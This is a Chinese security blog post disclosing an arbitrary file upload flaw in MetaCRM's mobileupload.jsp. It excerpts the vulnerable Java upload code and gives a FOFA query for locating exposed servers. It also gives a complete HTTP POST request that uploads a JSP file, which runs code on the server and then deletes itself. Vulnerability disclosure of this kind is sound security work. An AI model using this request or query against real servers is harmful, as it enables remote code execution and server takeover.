---
title: "美特CRM mobileupload.jsp 任意文件上传漏洞"
source: https://mrxn.net/jswz/metasoft-mobileupload-fileupload-rce.html
asset_dir: assets/美特crm-mobileupload.jsp-任意文件上传漏洞
---

# 美特CRM mobileupload.jsp 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/20 12:37
* 1047浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

SQL

鉴权

脚本语言


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM mobileupload.jsp 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者无需经过严格身份验证即可向服务器上传任意类型的文件，包括可执行的恶意[脚本](#)。一旦利用此漏洞，攻击者可能在服务器上部署后门、[WebShell](https://mrxn.net/tag/rce) 等恶意程序，从而实现远程代码执行、服务器控制，甚至进一步窃取敏感数据或破坏业务系统的正常运行。

客户关系管理

# 影响版本

# fofa语法

> body="/common/scripts/basic.js" && body="www.metacrm.com.cn"

# 漏洞分析

深入探索

VPN服务

网络安全培训

编码转换工具

直接看mobileupload.jsp实现逻辑当中关键部分

```
upload.setHeaderEncoding("utf-8");
upload.setProgressListener(getBarListener);
List uploadlist=upload.parseRequest(request);
Iterator iter=uploadlist.iterator();

while (iter.hasNext()) {
  FileItem item=(FileItem)iter.next();
  filename=org.apache.commons.io.FilenameUtils.getName(item.getName());

  if (!item.isFormField() && !sizeflag && !formatflag) {
      int iSept=filename.lastIndexOf(java.io.File.separator);
      if (iSept>0)
          filename=filename.substring(0,iSept);
      if (!filename.equals("")) {
          iSaveSize +=item.getSize();
      iSaveCount +=1;
      //System.out.println("start "+filename);
      affixID = com.metasoft.framework.pub.util.Oid.getOid();
      if (filename.indexOf(".")!=-1) {
          affixID +=filename.substring(filename.lastIndexOf("."));
      }
      java.io.File saveFilepath=new java.io.File(path+affixID);
                //是否有附件存储规则定义
                if(flag){
                    affixID = childPath+"/"+affixID;
                }
      item.write(saveFilepath);
    }
```

深入探索

Java平台

CRM

网络安全课程

最主要是上传文件后缀截取至用户上传设置的filename的最后一个点后的后缀，这个由用户控制，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

# 漏洞复现

```
POST /mobile/mobileupload.jsp HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123456

------WebKitFormBoundary123456
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary123456--
```

在响应里回显了文件路径以及文件名

漏洞预警服务

[![美特CRM mobileupload.jsp 任意文件上传漏洞](images/img-001-e5e4efc2a60a.webp)](https://image.mrxn.net/5e825030efef44ce9e68b186e1e376f8.webp)

访问上传文件，成功[执行代码](https://mrxn.net/tag/rce)，打印随机UUID并删除自身

[![美特CRM mobileupload.jsp 任意文件上传漏洞](images/img-002-989487703de4.webp)](https://image.mrxn.net/7e8acb5d3020413bb1fff7dcd3a57437.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[美特CRM mobileupload.jsp 任意文件上传漏洞](https://mrxn.net/jswz/metasoft-mobileupload-fileupload-rce.html)  
文章链接：<https://mrxn.net/jswz/metasoft-mobileupload-fileupload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/metasoft-mobileupload-fileupload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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